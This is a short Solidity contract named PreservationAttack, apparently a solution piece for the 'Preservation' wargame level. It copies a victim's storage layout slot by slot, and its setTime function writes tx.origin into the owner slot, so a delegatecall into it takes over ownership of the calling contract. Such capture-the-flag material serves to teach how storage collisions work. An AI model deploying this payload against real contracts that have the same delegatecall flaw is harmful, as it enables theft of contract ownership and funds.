// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {

    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    uint256 public storedTime;       // slot 3

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}
